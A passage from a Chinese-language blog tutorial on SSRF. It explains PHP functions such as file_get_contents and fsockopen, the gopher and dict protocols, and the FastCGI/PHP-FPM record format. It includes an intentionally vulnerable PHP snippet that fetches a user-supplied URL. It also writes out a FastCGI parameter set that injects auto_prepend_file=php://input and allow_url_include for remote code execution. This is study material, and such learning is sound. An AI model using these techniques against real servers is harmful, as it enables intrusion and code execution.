src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622165334021.png" alt="image-20220622165334021"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622165343882.png" alt="image-20220622165343882"></p><p>博客里面用来读取图片的这一段也算。</p><h2 id="4、实现攻击方式："><a href="#4、实现攻击方式：" class="headerlink" title="4、实现攻击方式："></a>4、实现攻击方式：</h2><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href="http://www.cnblogs.com/yuanshu/p/11588341.html">banner 信息</a></li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li><li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li><li>进行跳板</li><li>无视cdn</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ol><h2 id="5、SSRF漏洞相关函数和协议："><a href="#5、SSRF漏洞相关函数和协议：" class="headerlink" title="5、SSRF漏洞相关函数和协议："></a>5、SSRF漏洞相关函数和协议：</h2><h3 id="1、file-get-contents"><a href="#1、file-get-contents" class="headerlink" title="1、file_get_contents()"></a>1、file_get_contents()</h3><p>函数作用：</p><blockquote><p>将整个文件读入道一个字符串中：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622170026752.png" alt="image-20220622170026752"></p></blockquote><p><strong>（注意，不只是可以用来读取本地文件，同样也可以用来访问url表示的外部文件，否则就不会出现SSRF了）</strong></p><p><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p><p><strong>需要将php.ini中的allow_url_fopen设为on状态。</strong>预设是启动的。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、fsockopen"><a href="#2、fsockopen" class="headerlink" title="2、fsockopen()"></a>2、fsockopen()</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622171221093.png" alt="image-20220622171221093"></p></blockquote><p>使用例：</p><blockquote><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622171258168.png" alt="image-20220622171258168"></p></blockquote><p>这个函数的作用就是实现用户对于指定url数据的获取，使用套接字与服务器建立<code>tcp</code>连接，传输数据，变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30是时限。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>;  <span class="comment">//errno应该是错误号，404这种</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以和Python中的socket模块里的，socket.socket函数类比一下。用于建立传输链接。</p><h3 id="3、curl-exec"><a href="#3、curl-exec" class="headerlink" title="3、curl_exec()"></a>3、curl_exec()</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220623141239861.png" alt="image-20220623141239861"></p></blockquote><p>函数用于执行指定的curl会话。</p><blockquote><p>**什么是cURL?**（<a href="https://baike.baidu.com/item/curl/10098606?fr=aladdin%EF%BC%89">https://baike.baidu.com/item/curl/10098606?fr=aladdin）</a></p><p><strong>cURL是一个利用URL语法在命令行下工作的文件传输工具</strong>，1997年首次发行。</p><p>cURL支持的通信协议有：</p><p><a href="https://baike.baidu.com/item/FTP">FTP</a>、<a href="https://baike.baidu.com/item/FTPS">FTPS</a>、<a href="https://baike.baidu.com/item/HTTP">HTTP</a>、<a href="https://baike.baidu.com/item/HTTPS">HTTPS</a>、<a href="https://baike.baidu.com/item/TFTP">TFTP</a>、<a href="https://baike.baidu.com/item/SFTP">SFTP</a>、<a href="https://baike.baidu.com/item/Gopher">Gopher</a>、<a href="https://baike.baidu.com/item/SCP">SCP</a>、<a href="https://baike.baidu.com/item/Telnet">Telnet</a>、DICT、FILE、<a href="https://baike.baidu.com/item/LDAP">LDAP</a>、LDAPS、<a href="https://baike.baidu.com/item/IMAP">IMAP</a>、<a href="https://baike.baidu.com/item/POP3">POP3</a>、<a href="https://baike.baidu.com/item/SMTP">SMTP</a>和<a href="https://baike.baidu.com/item/RTSP">RTSP</a>。</p><p>此外，cURL还支持SSL认证，HTTP POST、HTTP PUT、FTP上传, HTTP form based upload、proxies、HTTP&#x2F;2、cookies、用户名+密码认证（包含了多种加密方式。）</p><p>常见的使用方法：</p><p><strong>获得页面</strong></p><p>使用命令：curl <a href="http://curl.haxx.se/">http://curl.haxx.se</a></p><p>这是最简单的使用方法。用这个命令获得了<a href="http://curl.haxx.se指向的页面,同样,如果这里的url指向的是一个文件或者一幅图都可以直接下载到本地.如果下载的是html文档,那么缺省的将只显示文件头部,即html文档的header.要全部显示,请加参数/">http://curl.haxx.se指向的页面，同样，如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地。如果下载的是HTML文档，那么缺省的将只显示文件头部，即HTML文档的header。要全部显示，请加参数</a> -i，要只显示头部，用参数 -I。任何时候，可以使用 -v 命令看curl是怎样工作的，它向服务器发送的所有命令都会显示出来。为了<a href="https://baike.baidu.com/item/%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0">断点续传</a>，可以使用-r参数来指定传输范围。 </p><p><strong>获取表单</strong></p><p>可以使用各种不同的参数来进行表单的传值，可以使用POST，也可以使用GET，同时也可以使用PUT或者是别的方式进行提交。</p><p><strong>有关认证</strong></p><p>可以处理各种情况的认证界面，例如提交用户名和密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -U proxyuser:proxypassword http://curl.haxx. se</span><br></pre></td></tr></table></figure><p><strong>引用</strong></p><p>有的网络资源访问的时候必须经过另外一个网络地址跳转过去，也就是使用了referer（可以参考一下http请求中的）</p><p><strong>指定客户端</strong></p><p>有的网络资源首先需要判断用户使用的是什么浏览器，符合了标准才能够下载或者浏览，可以使用curl伪装成为需要的浏览器。</p><p><strong>Cookie</strong></p><p>Cookie是服务器经常使用的一种记忆客户信息的方法，如果cookie被记录在了文件中，则可以根据旧的cookie写出性的，发送到网站。</p><p><strong>加密HTTP</strong></p><p>可以直接通过cURL访问网站。</p><p><strong>http认证</strong></p><p>如果是采用证书认证的http地址，证书在本地，则可以使用本地的证书认证来进行访问。</p><p>PHP中相关函数在4.0.2版本后被引入，相关函数：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220624145606239.png" alt="image-20220624145606239"></p></blockquote><p><strong>注意：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">2.file_get_contents的gopher协议不能URL编码</span><br><span class="line">3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">5.curl_exec() //默认不跟踪跳转，</span><br><span class="line">6.file_get_contents() // file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure><h3 id="4、fopen"><a href="#4、fopen" class="headerlink" title="4、fopen()"></a>4、fopen()</h3><p>用于打开一个文件或者是一个url。</p><h3 id="5、readfile"><a href="#5、readfile" class="headerlink" title="5、readfile()"></a>5、readfile()</h3><p>输出一个文件的内容。</p><h3 id="相关协议："><a href="#相关协议：" class="headerlink" title="相关协议："></a>相关协议：</h3><p>（1）<code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容<br>（2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br>（3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>（4）<code>http/s</code>：探测内网主机存活</p><p>（5）<code>FastCGI</code>：FastCGI协议</p><p>（6）<code>Redis</code>：REPS协议</p><p><strong>协议说明：</strong></p><h4 id="Gopher协议："><a href="#Gopher协议：" class="headerlink" title="Gopher协议："></a>Gopher协议：</h4><blockquote><p>Gopher协议是Internet上一个非常有名的信息查找系统，他将Internet上的文件组织成某种索引，很方便的将用户从Internet的一处带到另一处。在WWW出现之前，GOpher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但是在WWW出现之后，Gopher失去了昔日的辉煌。现在它基本果实，人们很少使用它。</p></blockquote><p>Gopher协议支持发送GET，POST请求，可以先结果GET请求包，和POST请求包，再构成复合Gopher协议的请求。</p><p>**gopher会将后面的数据部分发送给相应的端口，这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等，同时数据部分必须要进行url编码，这样gopher协议才能正确解析。<br>支持gopher协议的有  和  **</p><p><strong>Gopher协议格式</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">URL:gopher:<span class="comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span></span><br></pre></td></tr></table></figure><p><strong>默认使用端口：</strong>70</p><p>如果发起POST请求，需要使用<code>%0d%0a</code>作为换行符，如果多个参数，需要将链接符号<code>&amp;</code>也进行URL编码。</p><p>可以用于攻击内网的Redis，Mysql，FastCGI，FTP等，也可以发送GET，POST请求，拓宽了SSRF的攻击面。</p><p>（例如可以使用file协议，进行本地文件读取）</p><h4 id="FastCGI协议："><a href="#FastCGI协议：" class="headerlink" title="FastCGI协议："></a>FastCGI协议：</h4><blockquote><p>早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序(CGI程序)之间数据胡同，于是出现了CGI(Common Gateway Interface)通用网关接口。<strong>简单理解，可以认为CGI是Web服务器和运行在其上的应用程序进行“交流”的一种约定。</strong></p><p>当遇到动态脚本请求的时候，Web服务器的主进程就会Fork创建出一个新的进程来启动CGI程序，运行C、PHP等脚本程序的时候，也就是将动态脚本交给CGI程序进行处理。</p><p><strong>启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。</strong>这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p><p>而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。当有新的动态请求进来时，Web服务器就是自己解析这些动态脚本，省得重新Fork一个进程，效率提高了。</p></blockquote><blockquote><p>使用CGI可以解决Web服务器与PHP解释器的通信问题，但是Web服务器有一个问题，来回启动CGI程序然后再杀掉，是非常浪费资源的，于是出现了优化版本，FastCGI(Fast Common Gateway Interface)快速通用网关接口。</p><p><strong>Fast-CGI每次处理完请求后，不会kill掉这个进程，而是保留这个进程，从而使服务器可以同时处理更多的网页请求。这样就会大大的提高效率。</strong></p></blockquote><p><strong>动态网页访问：</strong></p><p>当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会去找PHP解析器来进行处理（这里以Apache为例），它会把这个请求进行简单的处理，然后交给PHP解释器。</p><p>当Apache收到用户对 index.php 的请求后，如果使用的是CGI，会启动对应的 CGI  程序，对应在这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以CGI规定的格式返回处理后的结果，退出进程，Web Server 再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p><p>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它像一个常驻的CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI是语言无关的、可伸缩架构的CGI开放扩展，<strong>其主要行为是将CGI解释器进程保持在内存中</strong>，并因此获得较高的性能 。</p><p><strong>协议分析：</strong></p><p>FastCGI其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是 <strong>浏览器和服务器中间件</strong> 进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比 HTTP 协议来说，<code>FastCGI</code>协议则是 <strong>服务器中间件和某个语言后端</strong>  进行数据交换的协议，同时直接使用二进制传递数据。Fastcgi 协议由多个 <code>Record</code> 组成，Record 也有 Header 和 Body  一说，服务器中间件将这二者按照 Fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照  Fastcgi 协议封装好后返回给<strong>服务器中间件</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220624193417656.png" alt="image-20220624193417656"></p><h5 id="FastCGI-Record的格式："><a href="#FastCGI-Record的格式：" class="headerlink" title="FastCGI Record的格式："></a><strong>FastCGI Record的格式：</strong></h5><p><strong>头部，身体：</strong></p><p>Record的头固定8个字节，body的大小由头部中contentLenght指定（两字节），结构如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  <span class="comment">/* Header */</span></span><br><span class="line">  unsigned char version; <span class="comment">// 版本</span></span><br><span class="line">  unsigned char type; <span class="comment">// 本次record的类型</span></span><br><span class="line">  unsigned char requestIdB1; <span class="comment">// 本次record对应的请求id(一个变量是一个字节，这里是两个变量，所以一共两个字节)</span></span><br><span class="line">  unsigned char requestIdB0; <span class="comment">//变量2</span></span><br><span class="line">  unsigned char contentLengthB1; <span class="comment">// body体的大小（同上，两个变量，一共两个字节）</span></span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; <span class="comment">// 额外块大小</span></span><br><span class="line">  unsigned char reserved;     <span class="comment">//保留字段</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Body */</span></span><br><span class="line">  unsigned char contentData[contentLength];     <span class="comment">//body内容数据</span></span><br><span class="line">  unsigned char paddingData[paddingLength];     <span class="comment">//填充数据</span></span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><p>头由8个 uchar 类型的变量组成，每个变量一个字节。其中，<code>requestId</code> 占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code> 占两个字节，表示 Body 的大小。可见，一个 Fastcgi Record 结构最大支持的 Body 大小是<code>2^16</code>，也就是 65536 字节（两个字节十六位，一位表示1，0两种情况）。</p><p><strong>字段选项：</strong></p><p>刚才我们介绍了 Fastcgi 协议中Record部分中各个结构的含义，其中第二个字节为 <code>type</code>，我们将对其进行详细讲解。</p><p><code>type</code> 就是指定该 Record 的作用。因为 Fastcgi 中一个 Record 的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个 Record，通过 <code>type</code> 来标志每个 Record 的作用，并用 <code>requestId</code> 来标识同一次请求的id。也就是说，每次请求，会有多个 Record，他们的 <code>requestId</code> 是相同的。</p><p>type字段选项：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">FCGI_Type</span> </span>&#123;</span><br><span class="line">  FCGI_BEGIN_REQUEST     = <span class="number">1</span>,  <span class="comment">// (WEB-&gt;FastCGI) 表示一次请求的开始</span></span><br><span class="line">  FCGI_ABORT_REQUEST     = <span class="number">2</span>,  <span class="comment">// (WEB-&gt;FastCGI) 表示终止一次请求</span></span><br><span class="line">  FCGI_END_REQUEST       = <span class="number">3</span>,  <span class="comment">// (FastCGI-&gt;WEB) 请求已被处理完毕</span></span><br><span class="line">  FCGI_PARAMS            = <span class="number">4</span>,  <span class="comment">// (WEB-&gt;FastCGI) 表示一个向CGI程序传递的环境变量</span></span><br><span class="line">  FCGI_STDIN             = <span class="number">5</span>,  <span class="comment">// (WEB-&gt;FastCGI) 表示向CGI程序传递的标准输入</span></span><br><span class="line">  FCGI_STDOUT            = <span class="number">6</span>,  <span class="comment">// (FastCGI-&gt;WEB) 表示CGI程序的标准输出   </span></span><br><span class="line">  FCGI_STDERR            = <span class="number">7</span>,  <span class="comment">// (FastCGI-&gt;WEB) 表示CGI程序的标准错误输出</span></span><br><span class="line">  FCGI_DATA              = <span class="number">8</span>,  <span class="comment">// (WEB-&gt;FastCGI) 向CGI程序传递的额外数据</span></span><br><span class="line">  FCGI_GET_VALUES        = <span class="number">9</span>,  <span class="comment">// (WEB-&gt;FastCGI) 向FastCGI程序询问一些环境变量</span></span><br><span class="line">  FCGI_GET_VALUES_RESULT = <span class="number">10</span>, <span class="comment">// (FastCGI-&gt;WEB) 询问环境变量的结果</span></span><br><span class="line">  FCGI_UNKNOWN_TYPE      = <span class="number">11</span>  <span class="comment">// 未知类型，可能用作拓展</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220624194357920.png" alt="image-20220624194357920"></p><p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是 <code>type</code> 为1的 Record，后续互相交流，发送 <code>type</code> 为4、5、6、7的 Record，结束时发送 <code>type</code> 为2、3的 Record。</p><p>当后端语言接收到一个 <code>type</code> 为4的 Record 后，就会把这个 Record 的 Body 按照对应的结构解析成 key-value 对，这就是环境变量。环境变量的结构如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"> </span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"> </span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"> </span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure><p>这其实是4个结构，至于用哪个结构，有如下规则：</p><p>1、key、value均小于128字节，用FCGI_NameValuePair11</p><p>2、key大于128字节，value小于128字节，用FCGI_NameValuePair41</p><p>3、key小于128字节，value大于128字节，用FCGI_NameValuePair14</p><p>4、key、value均大于128字节，用FCGI_NameValuePair44</p><h5 id="PHP-FPM："><a href="#PHP-FPM：" class="headerlink" title="PHP-FPM："></a>PHP-FPM：</h5><p>官方对PHP-FPM的解释是 FastCGI 进程管理器，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。PHP-FPM 默认监听的端口是 9000 端口。</p><p>也就是说 <strong>PHP-FPM 是 FastCGI 的一个具体实现</strong>，并且提供了进程管理的功能，在其中的进程中，包含了 master 和 worker 进程，这个在后面我们进行环境搭建的时候可以通过命令查看。其中<strong>master 进程负责与 Web 服务器中间件进行通信</strong>，接收服务器中间按照 FastCGI 的规则打包好的用户请求，再将请求转发给 worker 进程进行处理。<strong>worker 进程主要负责后端动态执行 PHP 代码，</strong>处理完成后，将处理结果返回给 Web 服务器，再由 Web 服务器将结果发送给客户端。</p><blockquote><p>简单来说，这个就是一个基于PHP语言实现的FastCGI进程管理器，因为FastCGI只是一个协议规范，需要每个语言具体去实现，PHP-FPM就是PHP版本的FastCGI协议的具体实现。使用这个，就是实现PHP脚本与Web服务器之间的同行，同时也是一个PHP SAPI，从而构建起了PHP解释器与Web服务器之间的桥梁。（或者可以理解为是PHP的环境，同时也是传输数据用的）</p></blockquote><p>例如当用户对<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>进行访问的时候，根据Web服务器的目录，Web服务器的中间件，将相关的请求进行变换，修改为key-value对（键值对）</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;, &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;, &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;, &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;, &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;, &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;&#125;</span><br></pre></td></tr></table></figure><p>总的来说，将具体请求更改为键值对，进行传输，可以看见，其中包含了网关，请求方式，Web服务器根目录，还有服务器名字等具体信息。</p><p>这个数组其实就是PHP中的预定义数组，__SERVER的一部分，也就是相当于是PHP中的环境变量，既可以对__SERVER数组进行填充，同时也可以对FPM（环境）告知需要执行的PHP文件。</p><p>当PHP-FPM拿到FastCGI的数据包的时候，进行解析，得到上述的环境变量，然后执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220702113123515.png" alt="image-20220702113123515"></p><p>（在这个部分）</p><p>如果可以进行更改，那就可以实现未授权访问。</p><h6 id="PHP-FPM任意代码执行"><a href="#PHP-FPM任意代码执行" class="headerlink" title="PHP-FPM任意代码执行:"></a>PHP-FPM任意代码执行:</h6><p>Web服务器中间件，会将用户请求设置为环境变量，并且会通过字段<code>SCRIPT_FILENAME</code>来对中间件执行的PHP文件进行设置。</p><p>理论上是只能对已经存在的文件进行执行，而不能进行任意代码执行。</p><p>但是因为在PHP 5.3.9以上的版本中，PHP多了一个选项<code>security.limit_extensions</code>安全选项。</p><p>导致PHP-FPM可以进行控制执行的文件只有php,php3,php4,php5,php7这样的文件。</p><p><strong>但是可以利用PHP中存在的配置：</strong></p><p><code>auto_prepend_file</code>:在执行目标文件之前先对auto_prepend_file中指定的文件进行包含。</p><p><code>auto_append_file</code>:在执行了目标文件之后，对auto_append_file指定的文件进行包含。</p><blockquote><p>也就是说，将<code>auto_prepend_file</code>选项设为<code>php://input</code>(将POST中的内容作为PHP代码执行)，那么在执行任何PHP文件之前都要对POST的内容进行一次文件执行。</p><p>也就是，将HTTP请求的body部分进行改写，就能够执行了。</p></blockquote><p>不过使用php:&#x2F;&#x2F;input使用也需要启用相关的配置。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220702120556587.png" alt="image-20220702120556587"></p><p><strong>如何设置环境变量的值：</strong></p><p>对于auto_prepend_file这类的环境变量，我们要想设置成php:&#x2F;&#x2F;input，就需要远程设置。</p><p>在PHP-FPM中有两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>，这两个环境变量可以用来设置PHP配置项。</p><p>其中：</p><blockquote><p><code>PHP_VALUE</code>:用来设置模式为：<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项。</p></blockquote><blockquote><p><code>PHP_ADMIN_VALUE</code>:可以用来设置所有选项</p></blockquote><p>通过这个方式对环境变量进行传入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;, &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;, &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;, &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;, &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;, &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27; &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;&#125;</span><br></pre></td></tr></table></figure><p>通过对传入的环境变量进行修改，可以将PHP-FPM中的环境变量进行设置。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220702173235441.png" 